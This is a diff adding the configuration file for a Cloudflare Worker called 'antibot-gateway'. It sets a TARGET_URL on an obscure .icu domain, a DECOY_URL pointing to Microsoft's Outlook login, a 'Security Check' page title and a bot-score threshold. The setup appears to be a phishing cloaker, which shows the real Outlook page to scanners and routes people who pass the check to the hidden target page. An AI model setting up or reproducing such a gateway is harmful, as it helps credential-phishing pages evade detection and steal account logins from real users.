@@ -1,0 +1,13 @@
+name = "antibot-gateway"
+main = "src/index.js"
+compatibility_date = "2024-12-01"
+
+[vars]
+TARGET_URL = "https://docs.cacts.icu/f/a1f48fc380ca"
+DECOY_URL = "https://outlook.office365.com"
+COOKIE_TTL = "14400"
+PAGE_TITLE = "Security Check"
+SCORE_THRESHOLD = "50"
+
+# COOKIE_SECRET should be set via `wrangler secret put COOKIE_SECRET`
+# Never commit secrets to this file.
